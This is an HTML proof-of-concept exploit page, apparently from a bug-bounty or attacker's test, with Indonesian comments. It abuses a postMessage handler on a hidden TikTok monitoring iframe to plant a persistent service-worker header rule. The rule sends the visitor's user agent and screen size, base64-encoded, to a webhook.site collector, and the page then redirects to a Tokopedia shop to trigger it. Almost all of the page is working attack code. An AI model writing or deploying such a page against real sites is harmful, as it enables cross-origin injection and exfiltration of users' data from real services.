<!DOCTYPE html>
<html>
<head><title>System Security Check</title></head>
<body style="background:#000;color:#0f0;font-family:monospace;text-align:center;padding-top:50px;">
    <h1>[ PHASE: EXFILTRATION ]</h1>
    <p id="msg">Injecting Data Harvester...</p>

    <iframe id="pwn_gate" src="https://mon.tiktokv.com/monitor_web/settings/browser-settings" style="display:none;"></iframe>

    <script>
        const gate = document.getElementById('pwn_gate');
        const webhook = "https://webhook.site/ID_LU_DI_SINI";

        // Payload ini memerintahkan SW untuk nempel-in info sensitif ke header
        const payload = {
            source: "main_thread",
            eventName: "network_rule",
            data: [{
                ruleName: "persistent_exfiltrator",
                global: true,
                handlers: [{
                    handler: "replace",
                    type: "header",
                    field: "X-Pns-Referrer",
                    // Kita ambil UserAgent & Resolusi layar sebagai bukti data exfiltration
                    value: webhook + "?info=" + btoa(navigator.userAgent + " | Res:" + screen.width + "x" + screen.height)
                }]
            }]
        };

        gate.onload = function() {
            document.getElementById('msg').innerText = "Infecting Target...";
            for(let i=0; i<40; i++) {
                gate.contentWindow.postMessage(payload, "*");
            }
            
            setTimeout(() => {
                document.getElementById('msg').innerText = "Success! Redirecting to Target...";
                // Pindah ke Tokopedia buat trigger SW-nya
                location.href = "https://shop-id.tokopedia.com";
            }, 5000);
        };
    </script>
</body>
</html>
